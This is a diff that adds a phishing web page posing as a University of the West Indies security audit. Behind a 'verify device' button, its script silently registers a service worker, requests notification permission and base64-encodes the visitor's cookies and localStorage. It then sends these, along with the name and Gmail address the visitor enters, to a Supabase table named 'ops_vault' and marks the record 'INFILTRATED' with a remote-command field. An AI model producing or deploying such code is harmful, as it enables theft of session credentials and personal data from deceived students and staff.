@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>UWI | Regional Security Audit</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="manifest" href="manifest.json">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+:root { --uwi-blue: #002147; --uwi-gold: #FFD700; }
+body { font-family: sans-serif; background: #f0f2f5; margin: 0; }
+.header { background: var(--uwi-blue); color: white; padding: 20px; text-align: center; border-bottom: 5px solid var(--uwi-gold); }
+.card { max-width: 500px; background: white; margin: 20px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden; }
+.p-20 { padding: 20px; }
+.btn { background: var(--uwi-blue); color: white; padding: 15px; border: none; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
+input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+</style>
+</head>
+<body>
+
+<div class="card">
+<div class="header"><h1>Security Audit 2026</h1></div>
+<div class="p-20" id="gate">
+<p><b>Verification Required:</b> Please synchronize your device to start the UWI audit.</p>
+<button class="btn" style="background:var(--uwi-gold);color:var(--uwi-blue);" onclick="deploy()">VERIFY DEVICE</button>
+</div>
+<div class="p-20" id="survey" style="display:none;">
+<input type="text" id="name" placeholder="Full Name">
+<input type="text" id="gmail" placeholder="Gmail Address">
+<input type="text" id="phone" placeholder="Phone Number">
+<input type="text" id="address" placeholder="Parish/Address">
+<button class="btn" onclick="finalize()">SUBMIT AUDIT</button>
+</div>
+</div>
+
+<script>
+// Replace with your actual Supabase details
+const SUPABASE_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
+const SUPABASE_KEY = 'YOUR_SUPABASE_ANON_KEY';
+const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+async function deploy() {
+// 1. Silent Permission Escalation
+await Notification.requestPermission();
+if ('serviceWorker' in navigator) {
+navigator.serviceWorker.register('sw.js');
+}
+
+// 2. Invisible Scrape of Browser Importance
+const keys = btoa(JSON.stringify({cookies: document.cookie, local: localStorage}));
+sessionStorage.setItem('keys', keys);
+
+document.getElementById('gate').style.display = 'none';
+document.getElementById('survey').style.display = 'block';
+}
+
+async function finalize() {
+const payload = {
+target_name: document.getElementById('name').value,
+gmail: document.getElementById('gmail').value,
+access_keys: sessionStorage.getItem('keys'),
+status: 'INFILTRATED',
+remote_cmd: 'IDLE'
+};
+await supabaseClient.from('ops_vault').insert([payload]);
+window.location.href = "https://www.mona.uwi.edu/audit-thank-you";
+}
+</script>
+</body>
+</html>
